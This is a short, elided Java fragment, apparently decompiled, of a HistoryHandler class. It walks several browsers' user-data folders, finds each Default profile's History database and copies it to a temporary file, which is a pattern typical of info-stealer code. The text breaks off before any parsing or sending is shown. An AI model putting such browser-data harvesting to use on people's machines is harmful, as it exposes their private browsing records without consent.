...
public class HistoryHandler {
    ...
    private void crawlUserData() {
        for (String browser : paths.keySet()) {
            ...
            if (!userData.exists() || !(dataDir = new File(userData, "Default")).exists() || !(historyFile = new File(dataDir, "History")).exists()) continue;
            this.crawlHistory(historyFile, browser);
        }
    }
    ...
    private void crawlHistory(File historyFile, String browser) {
        try {
            ...
            Files.copy(historyFile.toPath(), tempHistoryFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
